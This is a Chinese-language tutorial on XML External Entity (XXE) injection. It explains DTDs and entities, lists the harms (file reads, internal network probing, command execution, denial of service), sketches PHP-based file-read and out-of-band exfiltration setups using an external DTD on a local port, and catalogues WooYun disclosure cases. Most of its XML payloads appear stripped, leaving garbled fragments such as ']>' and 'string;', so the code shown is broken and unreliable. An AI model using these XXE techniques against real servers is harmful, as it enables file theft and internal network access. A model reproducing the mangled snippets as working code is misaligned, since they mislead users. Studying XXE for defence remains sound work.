# WHAT
## XML
XML是类似HTML的标记语言，但它们有所不同。
  * 其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。
  * 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。
  * 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。
  * `` 称为 `XML prolog` ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。
## DTD
XML元素以形如 `foo` 的标签开始和结束，如果元素内部出现如` & ' "` 。
实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type
Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。
DTD有两种形式：
    /*
    内部 DTD：
    外部 DTD：
    （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI）
    */
## ENTITY
我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：
    /*
    声明：
    ]>
    ]>
    ]>
    ]>
    除了 SYSTEM关键字外，外部实体还可用 PUBLIC关键字声明。
    引用：
    &普通实体名; //经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用
    %参数实体名; //经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用
    */
## 可能造成的危害
  * 本地文件读取
  * 内网访问，主机/端口扫描
  * 网络访问
  * 系统命令执行（特定协议，如PHP的expect）
  * 拒绝服务（嵌套引用，指数爆炸）
# HOW
URI支持的协议：
## 利用引用外部DTD发起网络请求
`test.php` 使用外部DTD对XML进行验证，如果XML可以注入且DTD的URI可控，就有发起网络请求的可能。在`192.168.1.2:80`
有Web服务而`192.168.1.3:80` 没有，DTD的URI不同时访问 `test.php` 就会得到不同的响应。
test.php
    load('with_external_dtd.xml');
    if ($dom->validate()) {echo "validated!\n";}
    else echo "invalid!\n";
with_external_dtd.xml
         -->
         -->
    Valar Morghulis
external_dtd
## 利用普通XXE读取文件/访问网络
    ]>
    &b;
    string;
    echo simplexml_load_string($s);
## 利用参数XXE读取文件/访问网络
    %b;]>
    &d;
    string;
    echo simplexml_load_string($s);
    // evil.txt :  
## XXE OOB
如果没有回显也没关系，可以利用外部参数实体将文件内容发送出去。这里注意参数实体引用 `%file;` 必须放在外部文件里，因为根据这条
[规则](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset) ，在内部DTD里，
参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错： `PEReferences forbidden in internal
subset` 。这里的`internal subset` 指的是中括号`[]` 内部的一系列元素声明，`PEReferences` 指的应该是参数实体引用
`Parameter-Entity Reference` 。
感觉在技术方面英文的表达力更强，这种情况叫做 `fetch external parsed entities using PEReference`
更好理解。
     %xxe;]>
    string;
    simplexml_load_string($s);
    /* // http://127.0.0.1:8088/xxe.txt:
    '> %x;
    %send;
    */
# 真实案例
  * 在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发。
    * WooYun-2014-73321（网易邮箱某处XXE可读取文件）
    * WooYun-2014-73439（QQ邮箱XXE可读取任意文件）
    * ......
  * 直接处理POST XML数据。WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）等很多。许多是直接 `simplexml_load_string` 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。
  * XML处理工具
    * WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。
    * WooYun-2015-134057（百度某平台Blind XXE漏洞&可Bool型SSRF攻击）XML检查工具。
    * WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具
  * WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。
  * WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。
  * WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。
  * WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）登陆与重置密码时使用XML传输数据。
  * WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。
  * WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 `content-type` 来区别对待提交的数据。`application/x-www-form-urlencoded` 、`application/json` 、`application/xml` 被用不同的方式解析。XML直接调用 `simplexml_load_string` 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。
  * WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 `关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。` ，我觉得有道理。`xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生` 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。
  * WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件`/home/run/ssh_go.sh` ，内含SSH登陆密码 orz。
  * 一些其他案例
    * [XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook's servers](https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution) 【Facebook OpenID功能点的XRDS XXE】